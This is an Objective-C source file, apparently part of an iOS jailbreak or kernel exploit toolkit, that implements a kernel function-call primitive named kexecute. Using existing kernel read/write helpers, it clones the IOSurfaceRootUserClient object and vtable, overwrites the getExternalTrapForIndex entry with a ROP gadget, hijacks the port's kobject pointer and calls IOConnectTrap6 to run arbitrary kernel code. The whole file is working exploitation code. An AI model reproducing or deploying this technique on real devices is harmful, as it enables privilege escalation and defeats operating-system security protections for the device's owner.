#include <Foundation/Foundation.h>
#include "kmem.h"
#include "kexecute.h"
#include "kern_utils.h"
#include "patchfinder64.h"
#include "offsetof.h"

mach_port_t prepare_user_client(void) {
  kern_return_t err;
  mach_port_t user_client;
  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));

  if (service == IO_OBJECT_NULL) {
    NSLog(@" [-] unable to find service");
    exit(EXIT_FAILURE);
  }

  err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
  if (err != KERN_SUCCESS){
    NSLog(@" [-] unable to get user client connection");
    exit(EXIT_FAILURE);
  }

  NSLog(@"got user client: 0x%x", user_client);
  return user_client;
}

static mach_port_t user_client;

void init_kexecute(void) {
}

void term_kexecute(void) {
}

uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    if (!user_client) {
        user_client = prepare_user_client();
    }
    
    static uint64_t IOSurfaceRootUserClient_port = 0;
    static uint64_t IOSurfaceRootUserClient_addr = 0;
    static uint64_t IOSurfaceRootUserClient_vtab = 0;
    
    if (IOSurfaceRootUserClient_vtab == 0) {
        IOSurfaceRootUserClient_port = find_port(user_client);
        IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject);
        IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr);
    
        NSLog(@"IOSurfaceRootUserClient_port: %llx", IOSurfaceRootUserClient_port);
        NSLog(@"IOSurfaceRootUserClient_addr: %llx", IOSurfaceRootUserClient_addr);
        NSLog(@"IOSurfaceRootUserClient_vtab: %llx", IOSurfaceRootUserClient_vtab);
    }
    
    static uint64_t fake_vtable = 0;
    static uint64_t fake_client = 0;
    
    if (!(fake_vtable && fake_client)) {
        fake_vtable = kalloc(0x1000);
        NSLog(@"Created fake_vtable at %016llx", fake_vtable);
        
        for (int i = 0; i < 0x200; i++) {
            wk64(fake_vtable + i * 8, rk64(IOSurfaceRootUserClient_vtab + i * 8 ));
        }
        
        NSLog(@"Copied some of the vtable over");
        
        fake_client = kalloc(0x1000);
        NSLog(@"Created fake_client at %016llx", fake_client);
        
        for (int i = 0; i < 0x200; i++) {
            wk64(fake_client + i * 8, rk64(IOSurfaceRootUserClient_addr + i * 8));
        }
        
        NSLog(@"Copied the user client over");
        
        wk64(fake_client, fake_vtable);
        
        wk64(fake_vtable + 8 * 0xB7, find_add_x0_x0_0x40_ret());
        // wk64(fake_vtable + 8 * 0xB7, 0xffffffffdeadbeef);
        
        NSLog(@"Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex");
    }
    
    wk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject, fake_client);
    // wk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject, 0xffffffffdeadbeef);
    
    wk64(fake_client + 0x50, 0);
    
    uint64_t offx20 = rk64(fake_client + 0x40);
    uint64_t offx28 = rk64(fake_client + 0x48);
    wk64(fake_client + 0x40, x0);
    wk64(fake_client + 0x48, addr);
    kern_return_t err = IOConnectTrap6(user_client, 0, x1, x2, x3, x4, x5, x6);
    wk64(fake_client + 0x40, offx20);
    wk64(fake_client + 0x48, offx28);
    
    wk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject, IOSurfaceRootUserClient_addr);
    
    return err;
}
